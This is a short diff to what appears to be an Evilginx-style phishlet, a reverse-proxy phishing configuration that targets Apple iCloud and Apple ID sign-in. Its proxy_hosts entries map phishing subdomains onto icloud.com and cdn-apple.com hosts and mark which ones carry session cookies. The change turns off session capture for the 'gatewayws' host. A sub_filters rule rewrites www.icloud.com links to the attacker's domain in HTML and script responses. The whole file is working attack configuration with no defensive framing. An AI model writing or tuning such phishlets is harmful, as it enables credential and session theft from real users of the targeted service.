@@ -8,7 +8,7 @@ proxy_hosts:
  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
- - {phish_sub: 'gatewayws', orig_sub: 'gatewayws', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
+ - {phish_sub: 'gatewayws', orig_sub: 'gatewayws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
